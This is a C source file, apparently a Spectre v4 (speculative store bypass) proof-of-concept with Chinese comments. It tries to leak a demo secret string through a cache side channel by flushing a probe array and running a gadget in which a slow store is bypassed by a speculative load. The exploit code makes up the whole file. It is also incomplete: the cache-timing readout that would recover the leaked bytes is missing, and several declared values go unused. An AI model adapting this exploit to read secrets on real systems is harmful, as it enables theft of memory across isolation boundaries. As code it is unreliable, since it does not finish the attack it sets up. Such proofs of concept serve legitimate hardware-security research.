#include <stdio.h>
#include <stdint.h>

#include "pre-exec/spectre-v4/cacheutils.h"

#define MAX_TRIES 10000
#define CACHE_HIT_THRESHOLD 150 //如果没有结果，或者输出是一些垃圾数据，可以适当调大阈值


unsigned char** memory_slot_ptr[256];
unsigned char* memory_slot[256]; //执行一个长度为256个unsigned char数组的指针

unsigned char secret_key[] = "The Magic Words are Squeamish Ossifrage.";
unsigned char overwrite[] = "###########################################################################";

#define LEN sizeof(secret_key)

uint8_t probe[256 * 4096];
volatile uint8_t tmp = 0;

//
void victim_function(size_t idx) {

	/*
	*spectre ssb gadget,
	*/
	unsigned char **memory_slot_slow_ptr = *memory_slot_ptr;
	*memory_slot_slow_ptr = overwrite; //slow store
	/*
	**此时的memory_slot指向的值应该是'#',但是被预测为不相关的load指令，直接从L1D中取数据，然后将之前的store数据泄漏到cache中
	*/
	tmp = probe[(*memory_slot)[idx] << 12]; //dependent WAR，but the load speculatively excuted using the stale data
}


int main(void) {
	for (int i = 0; i < sizeof(probe); ++i) {
		probe[i] = 1; // write to array2 so in RAM not copy-on-write zero pages
	}

	for (int idx = 0; idx < LEN; ++idx) {

		int results[256] = {0};
		unsigned int junk = 0;


			*memory_slot_ptr = memory_slot;
			*memory_slot = secret_key;

#if defined __aarch64__
			flush(memory_slot_ptr);
			for (int i = 0; i < 256; i++) {
				flush(&probe[i << 12]);
			}
			mfence();
#else
			_mm_clflush(memory_slot_ptr);
			for(int i = 0; i < 256; i++){
				_mm_clflush(&probe[i << 12]);
			}
			_mm_mfence();
#endif

			victim_function(idx);
	}
}




